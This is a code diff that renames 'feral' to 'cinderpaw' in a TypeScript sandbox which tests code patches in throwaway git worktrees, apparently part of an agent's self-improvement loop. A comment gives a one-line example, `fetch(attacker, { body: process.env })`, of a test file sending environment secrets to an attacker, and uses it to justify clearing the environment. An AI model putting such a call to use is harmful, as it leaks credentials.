@@ -61,7 +61,7 @@ export const DEFAULT_CODE_SANDBOX_TIMEOUTS: CodeSandboxTimeouts = {
 export interface CodeSandboxOptions {
   /** Root of the git repo worktrees are created from (the monorepo). */
   repoRoot: string;
-  /** Where disposable worktrees live. Default: `<tmp>/feral-code-rsi`. */
+  /** Where disposable worktrees live. Default: `<tmp>/cinderpaw-code-rsi`. */
   scratchDir?: string;
   /** Package dir (relative to repo root) where bun commands run and diff
    *  paths resolve. Default: `"CinderpawAgent"` (diffs are `src/rsi/…`). */
@@ -99,7 +99,7 @@ export async function evaluateCodePatch(
   const started = Date.now();
   const exec = options.exec ?? bunExec;
   const t = { ...DEFAULT_CODE_SANDBOX_TIMEOUTS, ...options.timeouts };
-  const scratch = options.scratchDir ?? join(tmpdir(), "feral-code-rsi");
+  const scratch = options.scratchDir ?? join(tmpdir(), "cinderpaw-code-rsi");
   const worktree = join(scratch, `wt-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);
   const pkgSubdir = options.packageSubdir ?? "CinderpawAgent";
   const pkgDir = join(worktree, pkgSubdir);
@@ -256,7 +256,7 @@ function resolveCmd(cmd: string[]): string[] {
  * Cinderpaw. One `fetch(attacker, { body: process.env })` inside a test file and
  * they are gone — and the crash watchdog's revert cannot un-send them.
  *
- * `crates/feral-core/src/tools.rs` already does this correctly for the
+ * `crates/cinderpaw-core/src/tools.rs` already does this correctly for the
  * `code_execute` tool (`env_clear()` plus PATH); this is the same rule applied
  * to the place that runs far less trusted code.
  *
